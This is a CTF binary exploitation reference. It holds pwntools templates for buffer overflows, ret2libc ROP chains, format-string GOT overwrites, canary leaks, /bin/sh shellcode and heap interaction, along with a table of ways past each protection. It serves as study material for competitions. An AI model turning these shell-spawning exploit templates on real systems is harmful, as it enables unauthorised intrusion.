# Pwn (Binary Exploitation) Reference

Methodology for binary exploitation CTF challenges: buffer overflows, format strings,
ROP chains, heap exploitation, and shellcode.

## Recon Checklist

```bash
file BINARY                          # arch, linking
checksec --file=BINARY               # protections
readelf -s BINARY | grep -iE 'win|flag|shell|system|exec'
objdump -d -M intel BINARY | grep -A5 '<main>'
strings BINARY | grep -iE 'flag|bin/sh|/bin/cat'
```

## Protection Bypass Summary

| Protection   | What it does                     | Bypass                                    |
|--------------|----------------------------------|-------------------------------------------|
| NX disabled  | Stack is executable              | Jump to shellcode on stack                |
| NX enabled   | Stack not executable             | ROP / ret2libc / ret2plt                  |
| No Canary    | No stack overflow detection      | Direct buffer overflow                    |
| Canary       | Random value before return addr  | Leak canary (format string, brute-force)  |
| No PIE       | Fixed binary addresses           | Use hardcoded gadget addresses            |
| PIE          | Randomized binary base           | Leak address, calculate base              |
| No ASLR      | Fixed libc/stack addresses       | Use hardcoded addresses                   |
| ASLR         | Randomized library addresses     | Leak libc address, calculate offsets      |
| Partial RELRO| GOT writable                     | GOT overwrite                             |
| Full RELRO   | GOT read-only after init         | Need other targets (hooks, stack)         |

## Buffer Overflow

### Finding the Offset

```python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(200)
print(pattern)

# After crash, find offset from the value in RIP/EIP:
offset = cyclic_find(0x61616174)  # replace with crash value
print(f"Offset to return address: {offset}")
```

Or manual: `python3 -c "print('A'*100 + 'B'*8)" | ./BINARY` — increase A count
until `0x4242424242424242` appears at crash.

### ret2win (no protections)

```python
from pwn import *

elf = ELF('./BINARY')
p = process('./BINARY')  # or remote('HOST', PORT)

offset = 40  # from cyclic
win_addr = elf.symbols['win']

payload = b'A' * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

### ret2libc (NX enabled, no PIE)

```python
from pwn import *

elf = ELF('./BINARY')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./BINARY')

offset = 40

# Stage 1: leak puts GOT address
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])  # return to main

payload1 = b'A' * offset + rop.chain()
p.sendline(payload1)

leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Stage 2: system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))

payload2 = b'A' * offset + rop2.chain()
p.sendline(payload2)
p.interactive()
```

### Stack Alignment (x86_64)

`system()` and many libc functions need 16-byte stack alignment. If exploit crashes
on `movaps`, insert a `ret` gadget:

```python
ret_gadget = rop.find_gadget(['ret'])[0]
payload = b'A' * offset + p64(ret_gadget) + p64(win_addr)
```

## Format String

### Detection

Input `%x.%x.%x.%x` — hex values in output = vulnerable.

### Leaking Data

```python
from pwn import *
p = process('./BINARY')

for i in range(1, 21):
    p.sendline(f'%{i}$p'.encode())
    print(f"Pos {i}: {p.recvline()}")
```

### Arbitrary Write (GOT overwrite)

```python
from pwn import *

elf = ELF('./BINARY')
p = process('./BINARY')

# Overwrite exit GOT with win address
payload = fmtstr_payload(offset, {elf.got['exit']: elf.symbols['win']})
p.sendline(payload)
```

### Leaking Canary

```python
# Leak canary via format string (usually offset 11-15)
p.sendline(b'%11$p')
canary = int(p.recvline().strip(), 16)

# Then overflow with correct canary
payload = b'A' * buf_size + p64(canary) + b'B' * 8 + p64(win_addr)
```

## Shellcode (NX disabled)

```python
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
# or: asm(shellcraft.cat('/flag.txt'))

offset = 40
buf_addr = 0x7fffffffde00  # leaked or known (no ASLR)

payload = b'\x90' * 20 + shellcode
payload += b'A' * (offset - len(payload))
payload += p64(buf_addr)

p.sendline(payload)
p.interactive()
```

## Heap Exploitation (Intermediate+)

Common techniques: Use-After-Free, Double Free, Heap Overflow, Tcache Poisoning.

```python
# Generic heap menu interaction
from pwn import *
p = process('./BINARY')

def alloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline()
```

## Pwntools Essentials

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Connect
p = process('./binary')
p = remote('challenge.ctf', 1337)

# I/O
p.sendline(b'data')
p.recvuntil(b'> ')
p.recvline()
p.interactive()

# Packing
p64(addr)                  # pack 64-bit LE
p32(addr)                  # pack 32-bit LE
u64(data.ljust(8, b'\x00'))  # unpack 64-bit

# ELF helpers
elf = ELF('./binary')
elf.symbols['main']
elf.got['puts']
elf.plt['puts']

# ROP
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.chain()
```

## Pitfalls

1. **Check protections first.** Don't write shellcode if NX is on.
2. **Stack alignment.** x86_64 needs 16-byte alignment for `system()`. Add `ret`.
3. **Null bytes.** `\x00` terminates strings in many I/O functions. Use ROP to avoid.
4. **Local vs remote libc.** Libc versions differ. Use the provided one.
5. **ASLR requires a leak.** No hardcoded addresses when ASLR is on.
6. **Canary ends with `\x00`.** Leak byte-by-byte if needed.
7. **Sync I/O with `recvuntil`.** Unsynchronized recv causes wrong data parsing.
8. **PIE means relative offsets only.** Leak binary base first.
